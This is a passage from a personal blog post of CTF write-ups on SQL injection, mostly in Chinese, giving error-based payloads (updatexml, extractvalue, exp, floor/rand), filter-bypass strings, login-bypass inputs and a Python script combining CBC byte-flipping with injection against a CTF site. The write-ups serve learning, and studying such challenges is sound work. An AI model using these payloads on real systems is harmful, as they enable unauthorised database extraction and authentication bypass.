<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">number=0&amp;username=test%00&apos; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select flag from ctf.flag limit 1))x from information_schema.tables group by x )a) ;%23 &amp;password=k&amp;submit=Submit+Query</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ps:group_concat 可能遇到未知问题</p>
</blockquote>
<p>updatexml:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">number=0&amp;username=test%00&apos; and updatexml(1,(select mid(concat(1,group_concat(flag)),1,64) from ctf.flag),1)%23&amp;password=k&amp;submit=Submit+Query</span><br></pre></td></tr></table></figure>
<p>报错位数有限，偏移一下就可以了。</p>
<p>注意：group_concat 之前不加东西可能读不全，如下</p>
<p><img src="https://user-images.githubusercontent.com/40637063/57983217-e271f600-7a81-11e9-9dd5-d087a09c7716.png" alt="image"></p>
<h2 id="多次">多次</h2>
<p>通过异或符号来检测有哪些符号被过滤了.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1&apos;</span><br><span class="line">1&quot;</span><br><span class="line">1&apos;--+</span><br><span class="line">1&quot;--+</span><br><span class="line">1&apos;^(0)--+</span><br><span class="line">1&apos;^(1)--+</span><br><span class="line">1&apos;^(length(&apos;select&apos;)&gt;0)--+</span><br><span class="line">1&apos;^(length(&apos;union&apos;)&gt;0)--+</span><br><span class="line">1&apos;^(length(&apos;or&apos;)&gt;0)--+</span><br><span class="line">.........</span><br><span class="line">-1&apos; uniunionon selselectect 1,2 --+</span><br><span class="line">-1&apos; uniunionon selselectect 1,database()--+</span><br><span class="line">-1&apos; uniunionon selselectect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+</span><br><span class="line">-1&apos; uniunionon selselectect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&apos;flag1&apos;--+</span><br><span class="line">-1&apos; uniunionon selselectect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&apos;hint&apos;--+</span><br><span class="line">-1&apos; uniunionon selselectect 1,group_concat(flag1,&quot; :: &quot;,address) from flag1--+</span><br></pre></td></tr></table></figure>
<p>and we get the second address</p>
<h2 id="ichunqiu-SQL">ichunqiu SQL</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.ichunqiu.com/battalion?q=2619</span><br><span class="line">https://www.ichunqiu.com/writeup/detail/1845</span><br></pre></td></tr></table></figure>
<p>关于为什么不需要闭合的原因，因为是id，id是int类型的，默认情况下就是where id=(数字)，因此不需要闭合，除非有额外处理，都是要试出来的</p>
<blockquote>
<p>小插入：在mysql5.7 以上版本中，select from users limit 1 union select from (select 1)a join (select 2)b join (select 3)c;已经不能使用了；<br>
取而代之的是：(select from users limit 1) union (select from (select 1)a join (select 2)b join (select 3)c);</p>
</blockquote>
<h2 id="shiyan-club-login-background">shiyan-club login background</h2>
<p>we can detect that many keywords are filtered,like ‘union’, ‘=’(so use ‘regexp’),’substr’,’mid’,and so on.</p>
<p>based on exp-error</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=1&amp;password=1&apos; or (exp(~(select * from (select group_concat(table_name) from information_schema.tables where table_schema regexp database())a))) or &apos;</span><br><span class="line">username=1&amp;password=1&apos; or (exp(~(select * from (select group_concat(colunm_name) from informaion_schema.columns where table_name regexp &apos;ffll44jj&apos;)a))) or &apos;</span><br><span class="line">username=1&amp;password=1&apos; or (exp(~(select * from (select group_concat(value) from ff1144jj)a))) or &apos;</span><br></pre></td></tr></table></figure>
<p>based on xml-error</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">xmlupdate and extractvalue</span><br><span class="line"></span><br><span class="line">username=1&apos; or/*&amp;password=&apos;*/extractvalue(1,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()))or&apos;</span><br><span class="line">/*this require did not work</span><br><span class="line"></span><br><span class="line">username=1&apos; or extractvalue/*&amp;password=&apos;*/(1,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()))or&apos;</span><br><span class="line">/*but the responce is &quot;SELECT command denied to user &apos;web8&apos;@&apos;localhost&apos; for table &apos;tables&apos;&quot;</span><br><span class="line">/*syntax error*/</span><br><span class="line">username=1&apos; or extractvalue/*&amp;password=&apos;*/(1,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()))or&apos;</span><br><span class="line">/*works but strangly , the first table_name do not show*/</span><br><span class="line">username=1&apos; or extractvalue/*&amp;password=&apos;*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp database())))or&apos;</span><br><span class="line">/*works and show all the table_name*/</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=1&apos; or updatexml/*&amp;password=&apos;*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()),0x7e),1)or&apos;</span><br><span class="line">/*works ,same problem happend when delete &apos;0x7e&apos;*/</span><br></pre></td></tr></table></figure>
<h2 id="shiyanbar-登陆一下好吗？">shiyanbar 登陆一下好吗？</h2>
<p>payload1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username:&apos;=&apos;</span><br><span class="line">password:&apos;=&apos;</span><br><span class="line">语句为：select flag from xxx where username=&apos;&apos;=&apos;&apos; and password=&apos;&apos;=&apos;&apos;;</span><br></pre></td></tr></table></figure>
<p>payload2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username:b&apos;+0;%00</span><br><span class="line">username 在burpsuite中改，%00在burpsuite中是%2500,变成%00,其他不变就可以了</span><br><span class="line">password:1</span><br><span class="line"># 语句为：select flag from xxx where username=&apos;a&apos;+0;%00&apos;and password=&apos;1&apos;;</span><br></pre></td></tr></table></figure>
<h2 id="cbc-字节翻转攻击注入">cbc 字节翻转攻击注入</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from base64 import *</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def denglu(payload,idx,c1,c2):</span><br><span class="line">    url=r&apos;http://ctf5.shiyanbar.com/web/jiandan/index.php&apos;</span><br><span class="line">    payload = &#123;&apos;id&apos;: payload&#125;</span><br><span class="line">    r = requests.post(url, data=payload)</span><br><span class="line">    Set_Cookie=r.headers[&apos;Set-Cookie&apos;]</span><br><span class="line">    iv=re.findall(r&quot;iv=(.*?),&quot;, Set_Cookie)[0]</span><br><span class="line">    cipher=re.findall(r&quot;cipher=(.*)&quot;, Set_Cookie)[0]</span><br><span class="line">    iv_raw = b64decode(urllib.unquote(iv))</span><br><span class="line">    cipher_raw=b64decode(urllib.unquote(cipher))</span><br><span class="line">    lst=list(cipher_raw)</span><br><span class="line">    lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))</span><br><span class="line">    cipher_new=&apos;&apos;.join(lst)</span><br><span class="line">    cipher_new=urllib.quote(b64encode(cipher_new))</span><br><span class="line">    cookie_new=&#123;&apos;iv&apos;: iv,&apos;cipher&apos;:cipher_new&#125;</span><br><span class="line">    r = requests.post(url, cookies=cookie_new)</span><br><span class="line">    cont=r.content</span><br><span class="line">    plain = re.findall(r&quot;base64_decode\(&apos;(.*?)&apos;\)&quot;, cont)[0]</span><br><span class="line">    plain = b64decode(plain)</span><br><span class="line">    first=&apos;a:1:&#123;s:2:&quot;id&quot;;s:&apos;</span><br><span class="line">    iv_new=&apos;&apos;</span><br><span class="line">    for i in range(16):</span><br><span class="line">        iv_new += chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))</span><br><span class="line">    iv_new = urllib.quote(b64encode(iv_new))</span><br><span class="line">    cookie_new = &#123;&apos;iv&apos;: iv_new, &apos;cipher&apos;: cipher_new&#125;</span><br><span class="line">    r = requests.post(url, cookies=cookie_new)</span><br><span class="line">    rcont = r.content</span><br><span class="line">    print rcont</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">denglu(&apos;12&apos;,4,&apos;2&apos;,&apos;#&apos;)</span><br><span class="line">denglu(&apos;0 2nion select * from((select 1)a join (select 2)b join (select 3)c);&apos;+chr(0),6,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">denglu(&apos;0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);&apos;+chr(0),7,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">denglu(&quot;0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp &apos;you_want&apos;)b join (select 3)c);&quot;+chr(0),7,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">denglu(&quot;0 2nion select * from((select 1)a join (select * from you_want)b join (select 3)c);&quot;+chr(0),6,&apos;2&apos;,&apos;u&apos;)</span><br></pre></td></tr></table></figure>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/04/22/XXE题型记录/" rel="next" title="XXE 题型记录[working forever]">
                <i class="fa fa-chevron-left"></i> XXE 题型记录[working forever]
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/04/22/XSS题型记录/" rel="prev" title="XSS & CSRF 题型记录[working forever]">
                XSS & CSRF 题型记录[working forever] <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/dogdog.jpg" alt="ch4ser">
            
              <p class="site-author-name" itemprop="name">ch4ser</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">45</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">3</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/ch4ser-go" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://twitter.com/ch4ser1" target="_blank" title="Twitter">
                      
                        <i class="fa fa-fw fa-twitter"></i>Twitter</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友链
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://forever404.cn" title="Forever" target="_blank">Forever</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://yml-sec.top/" title="YeMoLi" target="_blank">YeMoLi</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://althims.com" title="Moyu" target="_blank">Moyu</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://handsomedog.top" title="Handsomedog" target="_blank">Handsomedog</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://fightingtree.github.io" title="FightingTree" target="_blank">FightingTree</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Black-watch-入群题"><span class="nav-number">1.</span> <span class="nav-text">Black watch 入群题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网鼎杯-2018-unfinished"><span class="nav-number">2.</span> <span class="nav-text">网鼎杯 2018 unfinished</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCTF2015-EasySQL"><span class="nav-number">3.</span> <span class="nav-text">[RCTF2015]EasySQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验课遇见的题目"><span class="nav-number">4.</span> <span class="nav-text">实验课遇见的题目</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#极客大挑战-Final-SQL"><span class="nav-number">5.</span> <span class="nav-text">极客大挑战 Final SQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XDCTF-2015-filemanager"><span class="nav-number">6.</span> <span class="nav-text">XDCTF  2015 filemanager</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#facebook-ctf-2019-product-manager"><span class="nav-number">7.</span> <span class="nav-text">facebook ctf 2019 product manager</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#swpuctf-2019-web1"><span class="nav-number">8.</span> <span class="nav-text">swpuctf 2019 web1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#swpuctf-2019-web4"><span class="nav-number">9.</span> <span class="nav-text">swpuctf 2019 web4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Comment"><span class="nav-number">10.</span> <span class="nav-text">Comment</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#De1ta-ctf-2019-giftbox"><span class="nav-number">11.</span> <span class="nav-text">De1ta ctf 2019 giftbox</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CyBRICS-CTF-2019-NopeSQL"><span class="nav-number">12.</span> <span class="nav-text">CyBRICS CTF 2019 NopeSQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-百度杯Vld"><span class="nav-number">13.</span> <span class="nav-text">ichunqiu 百度杯Vld</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#多次"><span class="nav-number">14.</span> <span class="nav-text">多次</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ichunqiu-SQL"><span class="nav-number">15.</span> <span class="nav-text">ichunqiu SQL</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shiyan-club-login-background"><span class="nav-number">16.</span> <span class="nav-text">shiyan-club login background</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shiyanbar-登陆一下好吗？"><span class="nav-number">17.</span> <span class="nav-text">shiyanbar 登陆一下好吗？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cbc-字节翻转攻击注入"><span class="nav-number">18.</span> <span class="nav-text">cbc 字节翻转攻击注入</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ch4ser</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">74.1k</span>
  

  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
    </script>

    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_pv">
        本站总访问量: <span id="busuanzi_value_site_pv"></span>次
    </span>
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>








        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('3');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
  


  

  

</body>
</html>
